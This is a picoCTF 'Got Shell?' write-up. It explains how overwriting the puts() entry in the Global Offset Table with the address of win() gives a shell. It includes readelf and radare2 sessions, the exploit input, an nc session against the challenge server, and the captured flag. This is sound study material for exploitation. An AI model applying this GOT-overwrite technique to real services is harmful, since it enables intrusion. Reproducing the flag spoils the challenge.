# Got Shell?
Can you authenticate to this [service](auth) and get the flag? Connect to it with `nc 2018shell.picoctf.com 27952`. [Source](auth.c)


## Solution
The solution to this problem involved overwriting the [Global Offset Table](https://en.wikipedia.org/wiki/Global_Offset_Table) entry for the `puts(str)` function with the `win()` function.


### Global Offset Table
The global offset table (GOT) is a map between [Position Independent Code](https://en.wikipedia.org/wiki/Position-independent_code) (usually) in shared libraries (functions such as `printf`, `puts`, etc.) to their absolute memory address. This is necessary because [shared libraries](https://en.wikipedia.org/wiki/Library_(computing)#Shared_libraries) are loaded to different memory addresses each time the program is started (due to [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)).


By looking at the relocations in the [ELF file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) we see a list of symbols (of functions) that need to be patched at load time by the linker.

```
$ readelf --relocs auth

Relocation section '.rel.dyn' at offset 0x34c contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
 08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
 0804a030  00000905 R_386_COPY        0804a030   stdout@GLIBC_2.0

 Relocation section '.rel.plt' at offset 0x35c contains 7 entries:
  Offset     Info    Type            Sym.Value  Sym. Name
  0804a00c  00000107 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
  0804a010  00000207 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
  0804a014  00000407 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
  0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
  0804a01c  00000607 R_386_JUMP_SLOT   00000000   setvbuf@GLIBC_2.0
  0804a020  00000707 R_386_JUMP_SLOT   00000000   sprintf@GLIBC_2.0
  0804a024  00000807 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
```

> The dynamic loader will examine the relocation, go and find the value of a variable and patch the `.got` entry as required. When it comes time for the code loads to load that value, it will point to the right place and everything just works; without having to modify any code values and thus destroy code sharability.
>
> This handles data, but what about function calls? The indirection used here is called a procedure linkage table or PLT. Code does not call an external function directly, but only via a PLT stub.
>
> What's actually happening with `PLT` is lazy binding — by convention when the dynamic linker loads a library, it will put an identifier and resolution function into known places in the `GOT`. Therefore, what happens is roughly this: on the first call of a function, it falls through to call the default stub, which loads the identifier and calls into the dynamic linker, which at that point has enough information to figure out "hey, this libtest.so is trying to find the function foo". It will go ahead and find it, and then patch the address into the `GOT` such that the next time the original `PLT` entry is called, it will load the actual address of the function, rather than the lookup stub. Ingenious!

The blockquote, above, comes from [this](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html) very helpful article about `PLT` and `GOT`.


Looking at the source code, we see that we call `puts()` after assigning `value` to the location pointed by `address`:

```
sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
puts(buf);

*(unsigned int *)address = value;

puts("Okay, exiting now...\n");
```

Thus, the address for `puts()` was loaded in the `GOT` and therefore we could safely overwrite it with the address of `win()` without having to worry about the lazy loading logic of the `PLT`.


But how do we discover the address of `puts()` in the `GOT`?

By executing the command below we could get the location of the global offset table. We could also get the `GOT` address using [Radare2](https://en.wikipedia.org/wiki/Radare2).

```
$ readelf --syms auth | grep "_GLOBAL_OFFSET_TABLE_"
46: 0804a000     0 OBJECT  LOCAL  DEFAULT   24 _GLOBAL_OFFSET_TABLE_
```

```
$ r2 -d auth
[0xf5ac3a20]> xp @ obj._GLOBAL_OFFSET_TABLE 
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0804a000  149f 0408 0000 0000 0000 0000 d683 0408  ................
0x0804a010  e683 0408 f683 0408 0684 0408 1684 0408  ................
0x0804a020  2684 0408 3684 0408 0000 0000 0000 0000  &...6...........
0x0804a030  0000 0000 0000 0000 0000 0000 0000 0000  ................
[0xf5ac3a20]> Q
```

We could set a breakpoint at `puts()` in radare2 and `step` (using `ds`) forward until we find ourself in the `GOT`.


```
$ r2 -d auth
[0xf70baa20]> aaa
[0xf70baa20]> s main
[0x08048564]> pdf
            ; DATA XREF from entry0 @ 0x8048467
┌ 266: int main (int argc, char **argv, char **envp);
│           ; var int32_t var_11ch @ ebp-0x11c
│           ; var int32_t var_114h @ ebp-0x114
│           ; var int32_t var_110h @ ebp-0x110
│           ; var int32_t var_10ch @ ebp-0x10c
│           ; var int32_t var_ch @ ebp-0xc
│           ; arg int32_t arg_4h @ esp+0x144
│           0x08048564      8d4c2404       lea ecx, [arg_4h]
│           0x08048568      83e4f0         and esp, 0xfffffff0
│           0x0804856b      ff71fc         push dword [ecx - 4]
│           0x0804856e      55             push ebp
...
...	# skipped a bunch here
...
│           0x0804863b      50             push eax
│           0x0804863c      e88ffdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048641      83c410         add esp, 0x10
│           0x08048644      8b85ecfeffff   mov eax, dword [var_114h]
│           0x0804864a      89c2           mov edx, eax
│           0x0804864c      8b85f0feffff   mov eax, dword [var_110h]
│           0x08048652      8902           mov dword [edx], eax
│           0x08048654      83ec0c         sub esp, 0xc
│           0x08048657      68ac870408     push str.Okay__exiting_now... ; 0x80487ac ; "Okay, exiting now...\n"
│           0x0804865c      e86ffdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048661      83c410         add esp, 0x10
│           0x08048664      83ec0c         sub esp, 0xc
│           0x08048667      6a01           push 1                      ; 1
└           0x08048669      e882fdffff     call sym.imp.exit           ; void exit(int status)
[0x08048564]> db 0x0804863c
[0x08048564]> dc
I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?
0
Okay, now what value would you like to write to 0x0
0
hit breakpoint at: 804863c
```

Once we hit the breakpoint we have to step forward until we arrive at an address that doesn't look something in the `auth.c` code.

```
[0x0804863c]> ds
[0x080483d0]> ds
[0xf6f4a890]> xp @ obj._GLOBAL_OFFSET_TABLE 
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0804a000  149f 0408 20e9 0df7 e0f5 0cf7 90a8 f4f6  .... ...........
0x0804a010  e683 0408 f683 0408 9031 f0f6 00b0 f4f6  .........1......
0x0804a020  3048 f3f6 306b f4f6 0000 0000 0000 0000  0H..0k..........
0x0804a030  60fd 09f7 0000 0000 0000 0000 0000 0000  `...............
```

Notice that the value at `obj._GLOBAL_OFFSET_TABLE + 0xc` is the same as the location of the instruction pointer. Therefore the address for `puts()` is at `address = 0x0804a00c`!

```
[0xf6f4a890]> xp @ obj._GLOBAL_OFFSET_TABLE + 0xc
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0804a00c  90a8 f4f6 e683 0408 f683 0408 9031 f0f6  .............1..
0x0804a01c  00b0 f4f6 3048 f3f6 306b f4f6 0000 0000  ....0H..0k......
0x0804a02c  0000 0000 60fd 09f7 0000 0000 0000 0000  ....`...........
```

Now all that's left is the figure out what value to put there. But that's easy! Using Radare2 we could quickly find out the address of the `win()` function.


```
$ r2 -d auth                                                                                                   
[0xee61aa20]> aaa
[0xee61aa20]> afl
0x08048450    1 33           entry0
0x08048400    1 6            sym.imp.__libc_start_main
0x08048490    4 43           sym.deregister_tm_clones
0x080484c0    4 53           sym.register_tm_clones
0x08048500    3 30           entry.fini0
0x08048520    4 43   -> 40   entry.init0
0x080486d0    1 2            sym.__libc_csu_fini
0x08048480    1 4            sym.__x86.get_pc_thunk.bx
0x080486d4    1 20           sym._fini
0x08048670    4 93           sym.__libc_csu_init
0x0804854b    1 25           sym.win
0x080483e0    1 6            sym.imp.system
0x08048564    1 266          main
0x08048410    1 6            sym.imp.setvbuf
0x080483d0    1 6            sym.imp.puts
0x08048430    1 6            sym.imp.__isoc99_scanf
0x08048420    1 6            sym.imp.sprintf
0x080483f0    1 6            sym.imp.exit
0x08048394    3 35           sym._init
[0xee61aa20]> Q
```

Thus the `value = 0x0804854b`!

### Exploit
Using everything we learned from the [Solution](##Solution) section, above, we could put those the `address` and the `value` into a file called `exploit.in` and pipe that into the service.

```
$ cat exploit.in 
0804a00c
0804854b
```

Here is the full exploit:

```
$ (cat exploit.in ; cat) | nc 2018shell.picoctf.com 27952                                                      
I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?
Okay, now what value would you like to write to 0x804a00c
Okay, writing 0x804854b to 0x804a00c
id
uid=1221(got-shell-_0) gid=1222(got-shell-_0) groups=1222(got-shell-_0)
ls
auth
auth.c
flag.txt
xinet_startup.sh
cat flag.txt
picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_d496409a}
exit
```


The flag is `picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_d496409a}`.


### Hints
- Ever heard of the Global Offset Table?
